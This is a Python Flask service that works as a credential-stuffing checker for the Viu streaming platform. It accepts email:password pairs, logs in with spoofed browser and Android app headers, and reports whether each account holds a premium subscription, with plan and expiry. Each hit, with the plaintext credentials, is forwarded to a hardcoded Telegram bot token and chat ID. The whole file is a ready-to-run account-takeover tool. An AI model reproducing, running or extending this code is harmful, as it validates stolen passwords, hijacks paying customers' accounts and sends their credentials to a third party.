from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
from datetime import datetime, timedelta, timezone
import uuid
import re
import time
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)
CORS(app)
def send_telegram_message(message):
    try:
        bot_token = '7519569930:AAEeznsHyGZ6MbkQpIBTue3djsqdRmnD8mU'
        username = '1465561246'
    
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={username}&text={message}"

        requests.get(url)
    except Exception as e:
        send_message(message)

def generate_guid():
    return str(uuid.uuid4())
@app.route('/viucheck', methods=['GET'])
def viucheck():
    guid = generate_guid()
    ua = UserAgent()
    random_user_agent = ua.random
    creds = request.args.get('creds')
    if not creds:
        return jsonify({"error": "No credentials provided"}), 400

    try:
        email, password = creds.split(':')
    except ValueError:
        return jsonify({"error": "Invalid credentials format"}), 400
    
    login_data = {
        "email": email,
        "password": password,
        "provider": "email"
    }
    email = email
    password = password
    # Get token request
    get_token_url = "https://api-gateway-global.viu.com/api/auth/token?platform_flag_label=web&area_id=5&language_flag_id=3&platformFlagLabel=web&areaId=5&languageFlagId=3&countryCode=PH"
    get_token_headers = {
        "User-Agent": random_user_agent,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://www.viu.com/",
        "Content-Type": "application/json"
    }
    get_token_data = {
        "appVersion": "3.17.3",
        "countryCode": "PH",
        "language": "3",
        "platform": "browser",
        "platformFlagLabel": "web",
        "uuid": guid,
        "carrierId": "0"
    }
    get_token_response = requests.post(get_token_url, json=get_token_data, headers=get_token_headers)
    at = re.search(r"token\":\"(.*?)\"}", get_token_response.text).group(1)
    
    # Login request
    login_url = "https://api-gateway-global.viu.com/api/auth/login"
    login_headers = {
        "Host": "api-gateway-global.viu.com",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Authorization": f"Bearer {at}",
        "Origin": "https://umc-global.viu.com",
        "User-Agent": random_user_agent,
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Referer": "https://umc-global.viu.com/?platform=android",
        "Accept-Language": "en-PH,en-US;q=0.9",
        "X-Requested-With": "com.viu.pad",
        "Accept-Encoding": "gzip, deflate",
        "Content-Length": "73"
    }

    login_response = requests.post(login_url, json=login_data, headers=login_headers)
    
    # Check login response
    if any(key in login_response.text for key in ["status\":0", "Password must be in 6\\u201320 alphanumeric characters format.", "The email and password combination you have submitted is invalid", "error.user.auth.failed"]) or "401" in str(login_response.status_code):
        return jsonify({"error": "No credentials provided"}), 400
    
    nickname = re.search(r"nickname\":\"(.*?)\"", login_response.text)
    if nickname:
        nickname = nickname.group(1)
    
    at1 = re.search(r"token\":\"(.*?)\"}", login_response.text)
    if at1:
        at1 = at1.group(1)
    else:
        return jsonify({"error": "Failed to extract token from login_response."}), 400
    
    # User info request
    user_info_url = "https://api-gateway-global.viu.com/spu/bff/v2/paymentDetail?platform_flag_label=web&area_id=5&language_flag_id=3&platformFlagLabel=web&areaId=5&languageFlagId=3&countryCode=PH&ut=2"
    user_info_headers = {
        "platform": "android",
        "Authorization": f"Bearer {at1}",
        "Host": "api-gateway-global.viu.com",
        "Connection": "Keep-Alive",
        "User-Agent": "okhttp/3.12.1",
        "Accept-Encoding": "gzip, deflate"
    }
    user_info_response = requests.get(user_info_url, headers=user_info_headers)
    result = []
    result.append(f"Email Password : {email}:{password}")
    response_json = json.loads(user_info_response.text)
    if response_json['data']['subscription'] and (response_json['data']['subscription']['premiumUntil'] or response_json['data']['subscription']['planValidUntil']):
        # print(response_json['data']['subscription'])        
        result.append(f"Mode: {response_json['data']['subscription']['provider']}")
        result.append(f"Plan: {response_json['data']['subscription']['skuInfo']['partnerSkuName']}")
        result.append(f"Auto_Renew: {response_json['data']['subscription']['isRecurringSubscription']}")

        if response_json['data']['subscription']['premiumUntil'] :
            time_prem = response_json['data']['subscription']['premiumUntil']
        else:
            time_prem = response_json['data']['subscription']['planValidUntil']
        date_time_utc = datetime.fromtimestamp(int(time_prem), timezone.utc)  # Use timezone-aware object in UTC
        cst_timezone = timezone(timedelta(hours=8))
        date_time_cst = date_time_utc.astimezone(cst_timezone)
        expiry_date = date_time_cst.strftime('%Y-%m-%d')

        result.append(f"Expiration: {expiry_date}")
        result.append("Config: By VONEZ ✔️")
    else:
        result.append(f"Plan: BEYSIK_PLAN")
        result.append("Config: By VONEZ ❌")
    message = " | ".join(result)
    send_telegram_message(message)
    return message

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)
